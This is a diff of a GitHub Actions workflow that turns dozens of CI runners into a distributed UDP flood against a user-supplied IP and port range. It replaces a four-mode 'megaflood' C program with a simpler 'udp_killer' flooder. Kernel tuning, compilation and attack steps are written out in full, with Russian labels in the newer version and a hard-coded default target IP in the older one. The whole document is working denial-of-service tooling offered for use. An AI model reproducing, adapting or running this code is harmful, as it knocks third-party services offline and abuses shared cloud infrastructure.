@@ -1,61 +1,50 @@
-name: VPS Attack
-
+name: vps kill
 on:
   workflow_dispatch:
     inputs:
       target:
-        description: 'Target IP'
+        description: 'Целевой IP'
         required: true
-        default: '34.120.12.34'
       port:
-        description: 'Target Port'
+        description: 'Порт (один порт или диапазон через дефис)'
         required: true
-        default: '10001'
+        default: '10000-11000'
       duration:
-        description: 'Duration (seconds)'
+        description: 'Длительность атаки в секундах'
         required: true
-        default: '1800'
-      threads:
-        description: 'Threads per worker'
-        required: true
-        default: '2000'
+        default: 1800
+      workers:
+        description: 'Количество воркеров'
+        required: false
+        default: 50
+      threads_per_worker:
+        description: 'Потоков на воркер'
+        required: false
+        default: 2000
 
 jobs:
-  attack:
+  obliterate:
     runs-on: ubuntu-latest
-    timeout-minutes: 45
     strategy:
       max-parallel: 50
       matrix:
-        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33]
 
     steps:
-      - name: Kernel Tuning
+      - name: 🎯 SYSTEM HARDENING
         run: |
-          sudo sysctl -w net.core.rmem_max=2147483647
-          sudo sysctl -w net.core.wmem_max=2147483647
-          sudo sysctl -w net.core.rmem_default=268435456
-          sudo sysctl -w net.core.wmem_default=268435456
-          sudo sysctl -w net.core.netdev_max_backlog=1000000
-          sudo sysctl -w net.core.somaxconn=65535
-          sudo sysctl -w net.ipv4.udp_mem="8388608 16777216 33554432"
-          sudo sysctl -w net.ipv4.udp_rmem_min=16384
-          sudo sysctl -w net.ipv4.udp_wmem_min=16384
+          echo "=== WORKER ${{ matrix.worker }} ACTIVATED ==="
+          sudo sysctl -w net.core.rmem_max=536870912
+          sudo sysctl -w net.core.wmem_max=536870912
+          sudo sysctl -w net.core.netdev_max_backlog=250000
+          sudo sysctl -w net.ipv4.udp_mem="8388608 12582912 16777216"
           sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
-          sudo sysctl -w net.ipv4.tcp_tw_reuse=1
-          sudo sysctl -w net.ipv4.tcp_fin_timeout=10
-          sudo sysctl -w net.core.optmem_max=65536
-          sudo sysctl -w net.ipv4.conf.all.send_redirects=0
-          sudo sysctl -w net.ipv4.conf.default.send_redirects=0
-          
-          ulimit -n 1048576 2>/dev/null || true
-          ulimit -u unlimited 2>/dev/null || true
-          sudo bash -c 'echo "* soft nofile 1048576" >> /etc/security/limits.conf'
-          sudo bash -c 'echo "* hard nofile 1048576" >> /etc/security/limits.conf'
+          echo 0 | sudo tee /proc/sys/net/ipv4/conf/all/rp_filter 2>/dev/null || true
+          echo 0 | sudo tee /proc/sys/net/ipv4/conf/default/rp_filter 2>/dev/null || true
 
-      - name: Compile Arsenal
+      - name: 💣 COMPILE UDP FLOODER
         run: |
-          cat > megaflood.c << 'CEOF'
+          cat > udp_killer.c << 'EOL'
           #define _GNU_SOURCE
           #include <stdio.h>
           #include <stdlib.h>
@@ -63,505 +52,151 @@ jobs:
           #include <unistd.h>
           #include <pthread.h>
           #include <sys/socket.h>
-          #include <sys/time.h>
-          #include <sys/resource.h>
           #include <netinet/in.h>
-          #include <netinet/ip.h>
-          #include <netinet/udp.h>
           #include <arpa/inet.h>
           #include <time.h>
-          #include <errno.h>
-          #include <fcntl.h>
           #include <signal.h>
-          #include <sys/epoll.h>
-          #include <sys/mman.h>
-          #include <sched.h>
 
-          #define MAX_SOCKETS_PER_THREAD 16
-          #define BATCH_SIZE 256
-          #define MAX_PACKET_SIZE 1472
-          #define MIN_PACKET_SIZE 64
-
-          static volatile int running = 1;
-          static unsigned long long total_packets = 0;
-          static unsigned long long total_bytes = 0;
-          static pthread_mutex_t stats_lock = PTHREAD_MUTEX_INITIALIZER;
+          volatile int running = 1;
+          void handler(int sig) { running = 0; }
 
           typedef struct {
-              char *target_ip;
-              int target_port;
+              struct sockaddr_in *targets;
+              int target_count;
               int duration;
-              int thread_id;
-              int mode;
-              unsigned long long packets_sent;
-              unsigned long long bytes_sent;
+              int id;
           } thread_args;
 
-          static unsigned int fast_rand_state;
+          void *attack(void *arg) {
+              thread_args *args = (thread_args*)arg;
+              int sock = socket(AF_INET, SOCK_DGRAM, 0);
+              int buf = 268435456;
+              setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
 
-          static inline unsigned int fast_rand(void) {
-              fast_rand_state ^= (fast_rand_state << 13);
-              fast_rand_state ^= (fast_rand_state >> 17);
-              fast_rand_state ^= (fast_rand_state << 5);
-              return fast_rand_state;
-          }
-
-          static inline void fill_random_fast(char *buf, int len) {
-              unsigned int *p = (unsigned int*)buf;
-              int words = len / 4;
-              for (int i = 0; i < words; i++) {
-                  p[i] = fast_rand();
-              }
-          }
-
-          /* Mode 0: Multi-socket UDP blast */
-          void *udp_blast(void *arg) {
-              thread_args *ta = (thread_args*)arg;
-              
-              fast_rand_state = (unsigned int)(time(NULL) ^ ta->thread_id ^ getpid());
-              
-              int socks[MAX_SOCKETS_PER_THREAD];
-              int sock_count = 0;
-              
-              for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
-                  int s = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
-                  if (s < 0) continue;
-                  
-                  int buf = 536870912;
-                  while (buf > 65536) {
-                      if (setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf)) == 0) break;
-                      buf /= 2;
-                  }
-                  
-                  int val = 1;
-                  setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
-                  
-                  socks[sock_count++] = s;
-              }
-              
-              if (sock_count == 0) return NULL;
-              
-              struct sockaddr_in target;
-              memset(&target, 0, sizeof(target));
-              target.sin_family = AF_INET;
-              target.sin_port = htons(ta->target_port);
-              inet_pton(AF_INET, ta->target_ip, &target.sin_addr);
-              
-              /* Pre-allocate multiple packet buffers */
-              char packets[8][MAX_PACKET_SIZE];
-              for (int i = 0; i < 8; i++) {
-                  fill_random_fast(packets[i], MAX_PACKET_SIZE);
-              }
-              
-              /* Use mmsghdr for batch sending */
-              struct mmsghdr msgs[BATCH_SIZE];
-              struct iovec iovs[BATCH_SIZE];
-              
-              time_t end_time = time(NULL) + ta->duration;
-              unsigned long long local_packets = 0;
-              unsigned long long local_bytes = 0;
+              char packet[1518];
+              time_t end = time(NULL) + args->duration;
               unsigned int counter = 0;
-              int current_sock = 0;
-              
-              while (running && time(NULL) < end_time) {
-                  /* Prepare batch */
-                  int batch = BATCH_SIZE;
-                  for (int i = 0; i < batch; i++) {
-                      int pkt_idx = fast_rand() & 7;
-                      int size = MIN_PACKET_SIZE + (fast_rand() % (MAX_PACKET_SIZE - MIN_PACKET_SIZE));
-                      
-                      iovs[i].iov_base = packets[pkt_idx];
-                      iovs[i].iov_len = size;
-                      
-                      memset(&msgs[i], 0, sizeof(msgs[i]));
-                      msgs[i].msg_hdr.msg_name = &target;
-                      msgs[i].msg_hdr.msg_namelen = sizeof(target);
-                      msgs[i].msg_hdr.msg_iov = &iovs[i];
-                      msgs[i].msg_hdr.msg_iovlen = 1;
-                  }
-                  
-                  /* Send batch via sendmmsg */
-                  int sent = sendmmsg(socks[current_sock], msgs, batch, MSG_DONTWAIT);
-                  if (sent > 0) {
-                      local_packets += sent;
-                      for (int i = 0; i < sent; i++) {
-                          local_bytes += iovs[i].iov_len;
-                      }
-                  }
-                  
-                  current_sock = (current_sock + 1) % sock_count;
-                  counter++;
-                  
-                  /* Refresh packet content periodically */
-                  if ((counter & 0x3FF) == 0) {
-                      int idx = fast_rand() & 7;
-                      fill_random_fast(packets[idx], MAX_PACKET_SIZE);
-                  }
-                  
-                  /* Micro-yield to prevent single thread starvation */
-                  if ((counter & 0x1FFF) == 0) {
-                      sched_yield();
-                  }
-              }
-              
-              ta->packets_sent = local_packets;
-              ta->bytes_sent = local_bytes;
-              
-              for (int i = 0; i < sock_count; i++) close(socks[i]);
-              return NULL;
-          }
 
-          /* Mode 1: Fragmented UDP flood */
-          void *frag_flood(void *arg) {
-              thread_args *ta = (thread_args*)arg;
-              
-              fast_rand_state = (unsigned int)(time(NULL) ^ ta->thread_id ^ 0xDEAD);
-              
-              int socks[4];
-              int sock_count = 0;
-              for (int i = 0; i < 4; i++) {
-                  int s = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
-                  if (s < 0) continue;
-                  int buf = 536870912;
-                  while (buf > 65536) {
-                      if (setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf)) == 0) break;
-                      buf /= 2;
-                  }
-                  socks[sock_count++] = s;
-              }
-              if (sock_count == 0) return NULL;
-              
-              struct sockaddr_in target;
-              memset(&target, 0, sizeof(target));
-              target.sin_family = AF_INET;
-              inet_pton(AF_INET, ta->target_ip, &target.sin_addr);
-              
-              char payload[MAX_PACKET_SIZE];
-              fill_random_fast(payload, MAX_PACKET_SIZE);
-              
-              time_t end_time = time(NULL) + ta->duration;
-              unsigned long long local_packets = 0;
-              unsigned long long local_bytes = 0;
-              int si = 0;
-              unsigned int counter = 0;
-              
-              /* Scatter across port range near target */
-              int base_port = ta->target_port;
-              int port_range = 100;
-              
-              while (running && time(NULL) < end_time) {
-                  /* Vary target port slightly */
-                  int port = base_port + (fast_rand() % port_range) - (port_range / 2);
-                  if (port < 1) port = base_port;
-                  if (port > 65535) port = base_port;
-                  target.sin_port = htons(port);
-                  
-                  /* Send large payloads that force fragmentation */
-                  int size = 1400 + (fast_rand() % 72);
-                  fill_random_fast(payload, 64);
-                  
-                  for (int burst = 0; burst < 128; burst++) {
-                      if (sendto(socks[si], payload, size, MSG_DONTWAIT,
-                          (struct sockaddr*)&target, sizeof(target)) > 0) {
-                          local_packets++;
-                          local_bytes += size;
-                      }
-                      si = (si + 1) % sock_count;
-                  }
-                  
-                  counter++;
-                  if ((counter & 0xFFF) == 0) sched_yield();
-              }
-              
-              ta->packets_sent = local_packets;
-              ta->bytes_sent = local_bytes;
-              for (int i = 0; i < sock_count; i++) close(socks[i]);
-              return NULL;
-          }
+              const uint32_t magic_values[] = {
+                  0x9B000000, 0xFE000000, 0x00010000, 0xFFFFFFFF,
+                  0x08000000, 0x1700032A, 0x00000000, 0x01000000
+              };
 
-          /* Mode 2: High frequency small packet flood */
-          void *micro_flood(void *arg) {
-              thread_args *ta = (thread_args*)arg;
-              
-              fast_rand_state = (unsigned int)(time(NULL) ^ ta->thread_id ^ 0xBEEF);
-              
-              int socks[8];
-              int sock_count = 0;
-              for (int i = 0; i < 8; i++) {
-                  int s = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
-                  if (s < 0) continue;
-                  int buf = 268435456;
-                  while (buf > 65536) {
-                      if (setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf)) == 0) break;
-                      buf /= 2;
-                  }
-                  socks[sock_count++] = s;
-              }
-              if (sock_count == 0) return NULL;
-              
-              struct sockaddr_in target;
-              memset(&target, 0, sizeof(target));
-              target.sin_family = AF_INET;
-              target.sin_port = htons(ta->target_port);
-              inet_pton(AF_INET, ta->target_ip, &target.sin_addr);
-              
-              /* Small packets = more PPS = more interrupts on target */
-              char small_pkt[64];
-              fill_random_fast(small_pkt, 64);
-              
-              struct mmsghdr msgs[BATCH_SIZE];
-              struct iovec iovs[BATCH_SIZE];
-              
-              for (int i = 0; i < BATCH_SIZE; i++) {
-                  iovs[i].iov_base = small_pkt;
-                  iovs[i].iov_len = 64;
-                  memset(&msgs[i], 0, sizeof(msgs[i]));
-                  msgs[i].msg_hdr.msg_name = &target;
-                  msgs[i].msg_hdr.msg_namelen = sizeof(target);
-                  msgs[i].msg_hdr.msg_iov = &iovs[i];
-                  msgs[i].msg_hdr.msg_iovlen = 1;
-              }
-              
-              time_t end_time = time(NULL) + ta->duration;
-              unsigned long long local_packets = 0;
-              unsigned long long local_bytes = 0;
-              int si = 0;
-              unsigned int counter = 0;
-              
-              while (running && time(NULL) < end_time) {
-                  int sent = sendmmsg(socks[si], msgs, BATCH_SIZE, MSG_DONTWAIT);
-                  if (sent > 0) {
-                      local_packets += sent;
-                      local_bytes += sent * 64;
-                  }
-                  si = (si + 1) % sock_count;
-                  
-                  counter++;
-                  if ((counter & 0x3FFF) == 0) {
-                      fill_random_fast(small_pkt, 64);
-                      sched_yield();
-                  }
-              }
-              
-              ta->packets_sent = local_packets;
-              ta->bytes_sent = local_bytes;
-              for (int i = 0; i < sock_count; i++) close(socks[i]);
-              return NULL;
-          }
+              while (time(NULL) < end && running) {
+                  int target_idx = (counter / 1000) % args->target_count;
+                  struct sockaddr_in *addr = &args->targets[target_idx];
 
-          /* Mode 3: Mixed size chaos flood */
-          void *chaos_flood(void *arg) {
-              thread_args *ta = (thread_args*)arg;
-              
-              fast_rand_state = (unsigned int)(time(NULL) ^ ta->thread_id ^ 0xCAFE);
-              
-              int socks[8];
-              int sock_count = 0;
-              for (int i = 0; i < 8; i++) {
-                  int s = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
-                  if (s < 0) continue;
-                  int buf = 536870912;
-                  while (buf > 65536) {
-                      if (setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf)) == 0) break;
-                      buf /= 2;
-                  }
-                  socks[sock_count++] = s;
-              }
-              if (sock_count == 0) return NULL;
-              
-              struct sockaddr_in target;
-              memset(&target, 0, sizeof(target));
-              target.sin_family = AF_INET;
-              target.sin_port = htons(ta->target_port);
-              inet_pton(AF_INET, ta->target_ip, &target.sin_addr);
-              
-              char bigbuf[MAX_PACKET_SIZE];
-              fill_random_fast(bigbuf, MAX_PACKET_SIZE);
-              
-              /* Predefined sizes to avoid branch prediction */
-              int sizes[] = {64, 128, 256, 512, 768, 1024, 1280, 1472, 
-                            100, 200, 400, 600, 900, 1100, 1300, 1400};
-              int num_sizes = 16;
-              
-              struct mmsghdr msgs[BATCH_SIZE];
-              struct iovec iovs[BATCH_SIZE];
-              
-              time_t end_time = time(NULL) + ta->duration;
-              unsigned long long local_packets = 0;
-              unsigned long long local_bytes = 0;
-              int si = 0;
-              unsigned int counter = 0;
-              
-              while (running && time(NULL) < end_time) {
-                  for (int i = 0; i < BATCH_SIZE; i++) {
-                      int size = sizes[fast_rand() & 15];
-                      iovs[i].iov_base = bigbuf;
-                      iovs[i].iov_len = size;
-                      memset(&msgs[i], 0, sizeof(msgs[i]));
-                      msgs[i].msg_hdr.msg_name = &target;
-                      msgs[i].msg_hdr.msg_namelen = sizeof(target);
-                      msgs[i].msg_hdr.msg_iov = &iovs[i];
-                      msgs[i].msg_hdr.msg_iovlen = 1;
-                  }
-                  
-                  int sent = sendmmsg(socks[si], msgs, BATCH_SIZE, MSG_DONTWAIT);
-                  if (sent > 0) {
-                      local_packets += sent;
-                      for (int i = 0; i < sent; i++)
-                          local_bytes += iovs[i].iov_len;
-                  }
-                  
-                  si = (si + 1) % sock_count;
-                  counter++;
-                  
-                  if ((counter & 0x7FF) == 0) {
-                      fill_random_fast(bigbuf + (fast_rand() % 256), 256);
-                  }
-                  if ((counter & 0x3FFF) == 0) sched_yield();
-              }
-              
-              ta->packets_sent = local_packets;
-              ta->bytes_sent = local_bytes;
-              for (int i = 0; i < sock_count; i++) close(socks[i]);
-              return NULL;
-          }
+                  int size = 64 + (rand() % 1408);
+                  uint32_t magic = magic_values[rand() % 8];
+                  memcpy(packet, &magic, 4);
+                  uint32_t session = counter ^ (time(NULL) << 16);
+                  memcpy(packet + 4, &session, 4);
 
-          void signal_handler(int sig) {
-              running = 0;
+                  for (int i = 8; i < size; i++) {
+                      packet[i] = (i ^ counter) & 0xFF;
+                  }
+
+                  int burst = 32 + (rand() % 96);
+                  for (int b = 0; b < burst; b++) {
+                      sendto(sock, packet, size, 0,
+                             (struct sockaddr*)addr, sizeof(*addr));
+                  }
+                  counter++;
+                  usleep((rand() % 30) * 100);
+              }
+              close(sock);
+              return NULL;
           }
 
           int main(int argc, char *argv[]) {
-              if (argc != 5) {
-                  fprintf(stderr, "Usage: %s <threads> <duration> <port> <target_ip>\n", argv[0]);
+              if (argc != 6) {
+                  fprintf(stderr, "Usage: %s <threads> <duration> <port_start> <port_end> <target_ip>\n", argv[0]);
                   return 1;
               }
               
-              signal(SIGINT, signal_handler);
-              signal(SIGTERM, signal_handler);
-              
-              int num_threads = atoi(argv[1]);
+              signal(SIGINT, handler);
+              srand(time(NULL) ^ getpid());
+
+              int threads = atoi(argv[1]);
               int duration = atoi(argv[2]);
-              int port = atoi(argv[3]);
-              char *target_ip = argv[4];
-              
-              if (num_threads > 4096) num_threads = 4096;
-              if (num_threads < 1) num_threads = 100;
-              
-              /* Raise limits */
-              struct rlimit rl;
-              rl.rlim_cur = 1048576;
-              rl.rlim_max = 1048576;
-              setrlimit(RLIMIT_NOFILE, &rl);
-              
-              printf("🚀 MEGAFLOOD STARTING\n");
-              printf("🎯 Target: %s:%d\n", target_ip, port);
-              printf("⚡ Threads: %d (4 modes x %d each)\n", num_threads * 4, num_threads);
-              printf("⏱️  Duration: %ds\n", duration);
-              printf("📦 Sockets per thread: %d\n", MAX_SOCKETS_PER_THREAD);
-              printf("📨 Batch size: %d\n", BATCH_SIZE);
-              fflush(stdout);
-              
-              int total_threads = num_threads * 4;
-              thread_args *args = calloc(total_threads, sizeof(thread_args));
-              pthread_t *threads = calloc(total_threads, sizeof(pthread_t));
-              
-              void *(*modes[])(void*) = {udp_blast, frag_flood, micro_flood, chaos_flood};
-              char *mode_names[] = {"UDP_BLAST", "FRAG_FLOOD", "MICRO_FLOOD", "CHAOS_FLOOD"};
-              
-              int idx = 0;
-              for (int m = 0; m < 4; m++) {
-                  for (int t = 0; t < num_threads; t++) {
-                      args[idx].target_ip = target_ip;
-                      args[idx].target_port = port;
-                      args[idx].duration = duration;
-                      args[idx].thread_id = idx;
-                      args[idx].mode = m;
-                      args[idx].packets_sent = 0;
-                      args[idx].bytes_sent = 0;
-                      
-                      pthread_attr_t attr;
-                      pthread_attr_init(&attr);
-                      pthread_attr_setstacksize(&attr, 256 * 1024);
-                      
-                      if (pthread_create(&threads[idx], &attr, modes[m], &args[idx]) != 0) {
-                          fprintf(stderr, "Thread %d create failed\n", idx);
-                      }
-                      pthread_attr_destroy(&attr);
-                      idx++;
-                  }
-                  printf("✅ Launched %d %s threads\n", num_threads, mode_names[m]);
-                  fflush(stdout);
+              int ports_start = atoi(argv[3]);
+              int ports_end = atoi(argv[4]);
+              char *target_ip = argv[5];
+
+              int port_count = ports_end - ports_start + 1;
+              struct sockaddr_in *targets = malloc(port_count * sizeof(*targets));
+
+              for (int i = 0; i < port_count; i++) {
+                  targets[i].sin_family = AF_INET;
+                  targets[i].sin_port = htons(ports_start + i);
+                  inet_pton(AF_INET, target_ip, &targets[i].sin_addr);
               }
-              
-              /* Progress monitor */
-              time_t start = time(NULL);
-              int elapsed = 0;
-              while (running && elapsed < duration) {
-                  sleep(5);
-                  elapsed = (int)(time(NULL) - start);
-                  
-                  unsigned long long tp = 0, tb = 0;
-                  for (int i = 0; i < idx; i++) {
-                      tp += args[i].packets_sent;
-                      tb += args[i].bytes_sent;
-                  }
-                  
-                  double gpps = (double)tp / (elapsed > 0 ? elapsed : 1) / 1000000.0;
-                  double gbps = (double)tb * 8.0 / (elapsed > 0 ? elapsed : 1) / 1000000000.0;
-                  
-                  printf("📊 [%ds/%ds] %.2fM pps | %.2f Gbps | %llu total packets\n",
-                      elapsed, duration, gpps, gbps, tp);
-                  fflush(stdout);
+
+              pthread_t *pt = malloc(threads * sizeof(pthread_t));
+              thread_args *args = malloc(threads * sizeof(thread_args));
+
+              for (int i = 0; i < threads; i++) {
+                  args[i].targets = targets;
+                  args[i].target_count = port_count;
+                  args[i].duration = duration;
+                  args[i].id = i;
+                  pthread_create(&pt[i], NULL, attack, &args[i]);
               }
-              
+
+              sleep(duration);
               running = 0;
-              
-              /* Wait for threads */
-              for (int i = 0; i < idx; i++) {
-                  pthread_join(threads[i], NULL);
-              }
-              
-              /* Final stats */
-              unsigned long long final_packets = 0, final_bytes = 0;
-              for (int i = 0; i < idx; i++) {
-                  final_packets += args[i].packets_sent;
-                  final_bytes += args[i].bytes_sent;
-              }
-              
-              printf("\n🏁 ATTACK COMPLETE\n");
-              printf("📦 Total packets: %llu\n", final_packets);
-              printf("💾 Total data: %.2f GB\n", (double)final_bytes / 1073741824.0);
-              printf("📊 Avg PPS: %.2fM\n", (double)final_packets / duration / 1000000.0);
-              printf("📊 Avg BPS: %.2f Gbps\n", (double)final_bytes * 8.0 / duration / 1000000000.0);
-              fflush(stdout);
-              
-              free(args);
-              free(threads);
+              for (int i = 0; i < threads; i++) pthread_join(pt[i], NULL);
+
+              free(targets); free(pt); free(args);
               return 0;
           }
-          CEOF
-          
-          gcc -O3 -march=native -pthread -o megaflood megaflood.c -lm
-          echo "✅ Compiled megaflood (4 attack modes)"
+          EOL
 
-      - name: Run Attack
+          gcc -O3 -pthread -flto -o udp_killer udp_killer.c
+
+      - name: 🔥 EXECUTE ATTACK
         run: |
-          TARGET="${{ github.event.inputs.target }}"
-          PORT="${{ github.event.inputs.port }}"
-          DURATION="${{ github.event.inputs.duration }}"
-          THREADS="${{ github.event.inputs.threads }}"
-          WORKER="${{ matrix.worker }}"
+          # Парсим порты
+          PORT_INPUT="${{ github.event.inputs.port }}"
           
-          echo "============================================"
-          echo "💀 WORKER #${WORKER} LAUNCHING"
-          echo "🎯 Target: ${TARGET}:${PORT}"
-          echo "⏱️  Duration: ${DURATION}s"
-          echo "⚡ Threads: ${THREADS} x 4 modes = $((THREADS * 4))"
-          echo "============================================"
+          # Проверяем формат: один порт или диапазон
+          if [[ "$PORT_INPUT" =~ ^[0-9]+$ ]]; then
+              PORTS_START=$PORT_INPUT
+              PORTS_END=$PORT_INPUT
+          elif [[ "$PORT_INPUT" =~ ^([0-9]+)-([0-9]+)$ ]]; then
+              PORTS_START=${BASH_REMATCH[1]}
+              PORTS_END=${BASH_REMATCH[2]}
+          else
+              PORTS_START=10000
+              PORTS_END=11000
+          fi
+
+          echo "🔥 TARGET: ${{ github.event.inputs.target }}"
+          echo "🔥 PORTS: $PORTS_START-$PORTS_END"
+          echo "🔥 DURATION: ${{ github.event.inputs.duration }}s"
+          echo "🔥 WORKER #${{ matrix.worker }}"
+          echo "🔥 THREADS: ${{ github.event.inputs.threads_per_worker }}"
+
+          # Запускаем в фоне и ждем duration секунд
+          ./udp_killer \
+              ${{ github.event.inputs.threads_per_worker }} \
+              ${{ github.event.inputs.duration }} \
+              $PORTS_START $PORTS_END \
+              "${{ github.event.inputs.target }}" &
           
-          # Run the megaflood
-          timeout $((DURATION + 30)) ./megaflood ${THREADS} ${DURATION} ${PORT} ${TARGET} || true
+          FLOODER_PID=$!
+          echo "Flooder PID: $FLOODER_PID"
           
-          echo "============================================"
-          echo "✅ Worker #${WORKER} finished"
-          echo "============================================"
+          # Ждем указанное время
+          sleep ${{ github.event.inputs.duration }}
+          
+          # Убиваем процесс после окончания времени
+          kill -INT $FLOODER_PID 2>/dev/null || true
+          wait $FLOODER_PID 2>/dev/null || true
+          
+          echo "✅ Attack completed"
+
+      - name: 📊 STATUS
+        if: always()
+        run: |
+          echo "✅ WORKER ${{ matrix.worker }} COMPLETED"
